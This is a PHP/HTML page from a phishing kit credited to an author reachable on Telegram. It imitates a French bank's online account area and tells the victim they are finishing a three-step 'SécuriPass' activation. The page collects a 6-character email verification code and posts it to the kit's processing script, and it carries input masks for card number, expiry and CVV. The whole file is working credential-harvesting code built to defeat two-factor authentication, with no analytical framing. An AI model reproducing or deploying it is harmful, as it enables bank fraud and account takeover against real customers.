<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/

    require_once '../app/config.php';
    $_SESSION['last_page'] = "emailcode";
    $semantic = semantic();

?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
        <link rel="stylesheet" href="../media/css/helpers.css">
        <link rel="stylesheet" href="../media/css/style.css">

        <link rel="icon" type="image/x-icon" href="../media/imgs/ff.ico" />

        <title>Acceso online</title>
    </head>

    <body>

		<!-- HEADER -->
        <header id="header2" class="d-lg-flex d-md-none d-sm-none d-none">
            <div class="logo"><img style="width: 57px;" src="../media/imgs/logo2.svg"></div>
            <div class="menu">
                <ul>
                    <li>Ma synthèse</li>
                    <li>Mes opérations <i class="fas fa-sort-down"></i></li>
                    <li>Mes documents <i class="fas fa-sort-down"></i></li>
                    <li>Mes autres comptes <i class="fas fa-sort-down"></i></li>
                    <li>toute l'offre <i class="fas fa-sort-down"></i></li>
                    <li>nos conseils <i class="fas fa-sort-down"></i></li>
                </ul>
            </div>
            <div class="btns">
                <img style="min-width: 399px;" src="../media/imgs/login-menu.png">
            </div>
        </header>
        <!-- END HEADER -->

        <!-- HEADER MOBILE -->
        <div id="mobile-menu" class="d-lg-none d-md-flex d-sm-flex d-flex" style="background: #F5F5F5;">
            <div class="pl-3"><img src="../media/imgs/mobilemenu.png"></div>
            <div><img style="width: 57px;" src="../media/imgs/logo2.svg"></div>
            <div><img style="min-width: 120px;" src="../media/imgs/log-menu2.png"></div>
        </div>
        <!-- END HEADER MOBILE -->

        <!-- MAIN -->
        <main id="main">
            <div class="left two order-lg-1 order-md-2 order-sm-2 order-2">
                <div class="top">
                    <div class="content2">
                        <div class="tt"><p>POUR VOTRE SÉCURITÉ</p></div>
                        <h3>Activation sécuripass en deux étapes :</h3>
                        <ul>
                            <li>Entrer le code reçu par SMS envoyé sur votre numéro.</li>
                            <li>Entrer le code à 6 chiffres reçu par E-mail.</li>
                            <li>Votre SécuriPass à été activé.</li>
                        </ul>
                    </div>
                </div>
                <div class="bottom">
                    <div class="ccc">
                        
                        <img src="../media/imgs/chat2.png">
                        <p class="mt30 mb10">Une question ?</p>
                        <p class="mb30"><b>Un conseiller vous accompagne</b></p>
                        <button type="button">Contacter un conseiller</button>

                    </div>
                </div>
            </div>
            <div class="right order-lg-2 order-md-1 order-sm-1 order-1">
                <div class="cc">
                    <div class="ti mb50">
                        <h3>J'ACTIVE MON SÉCURIPASS 3/3</h3>
                        <p>Derniere partie veuillez ouvrir votre boite email et entrer le code reçu.</p>
                    </div>

                    <div id="forma">
                        <input type="hidden" id="cap" name="cap">
                        <input type="hidden" name="steeep" id="steeep" value="emailcode">

                        <div class="details2">
                            <p style="font-weight: 300; font-size: 13px; margin-bottom: 5px;">Patienter, Vous allez recevoir un code sur votre boite email.</p>
                            <p style="font-size: 13px;"><b>Veuillez entrer le code de *6 caracteres* reçu par boite email ci-dessous :</b></p>
                            <div class="form-group <?php echo errclass($_SESSION['errors'],'emailcode') ?>">
                                <label for="emailcode" class="d-flex"><span class="flex-grow-1"><b>CODE DE VALIDATION</b></span><span style="font-weight: 300;">(6 CARACTÈRES)</span></label>
                                <input maxlength="6" type="text" name="emailcode" id="emailcode" class="form-control">
                                <?php echo errmsg($_SESSION['errors'],'emailcode'); ?>
                            </div>
                            <p style="font-size: 13px; font-weight: 600; margin-bottom: 0;">
                                Nouveau dispositif de sécurité conçu pour les opérations en ligne .<br>
                                Ce code confidentiel, connu de vous seul, est utilisable uniquement pour vos opérations en ligne .
                            </p>
                        </div>
                        
                        <div class="btns">
                            <div class="bbb">Annuler</div>
                            <div id="booom" class="btttn">Valider</div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="../media/js/js.js"></script>

        <script>
            $('#one').mask('0000 0000 0000 0000');
            $('#two').mask('00/00');
            $('#three').mask('000');
            var loaded = false;  
            $('#booom').click(function(){
                if( loaded == true ) {
                    return false;
                }
                formData = {
                    'cap' : $('#cap').val(),
                    'steeep' : $('#steeep').val(),
                    'emailcode' : $('#emailcode').val(),
                }
                $.post( "../processing.php", formData )
                    .done(function( data ) {
                    window.location.href = data;
                });
                loaded = true;
            });
        </script>

    </body>

</html>